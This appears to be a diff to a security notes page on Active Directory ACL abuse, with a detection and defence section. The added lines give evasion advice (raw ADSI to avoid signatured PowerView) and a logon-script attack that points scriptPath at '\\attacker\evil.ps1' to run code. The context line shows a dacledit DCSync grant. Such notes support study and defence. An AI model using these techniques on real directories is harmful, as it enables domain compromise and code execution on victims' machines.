@@ -40,6 +40,8 @@ dacledit.py -action write -rights DCSync -principal me corp/me:'pw'@dc
 
 Don't forget inherited ACEs from OUs and the implicit owner-write rule: an object's owner can always rewrite its DACL — useful when WriteOwner is the only edge.
 
+ADSI bypass: when `Set-Acl` or the AD PowerShell module refuses (signature checks, missing module, or a constrained-language host), fall back to raw `[ADSI]` + `ActiveDirectoryAccessRule` to commit the ACE — this also tends to be quieter than dropping `Add-DomainObjectAcl` from PowerView, which is heavily signatured. A often-missed edge is `WriteProperty` on `scriptPath` alone: it doesn't grant password reset or SPN write, but pointing the victim's logon script at `\\attacker\evil.ps1` fires arbitrary code at their next interactive logon — handy when the only foothold ACE is that single property write.
+
 ## Detection and defence
 - Tier the directory: keep tier-0 (DCs, AdminSDHolder, cert templates, GPOs linked to DC OU) clean of low-tier write rights.
 - Audit DS-object-access (4662) for writes to `nTSecurityDescriptor`, `msDS-KeyCredentialLink`, `servicePrincipalName`, `msDS-AllowedToActOnBehalfOfOtherIdentity`.
@@ -52,3 +54,4 @@ Don't forget inherited ACEs from OUs and the implicit owner-write rule: an objec
 - [HackTricks — ACL persistence and abuse](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html) — primitive catalogue
 - [the.hacker.recipes — DACL](https://www.thehacker.recipes/ad/movement/dacl) — per-edge walkthrough
 - [BloodHound community docs](https://bloodhound.specterops.io/) — edge-by-edge abuse info
+- [ired.team — abusing AD ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) — PowerView and raw ADSI primitives
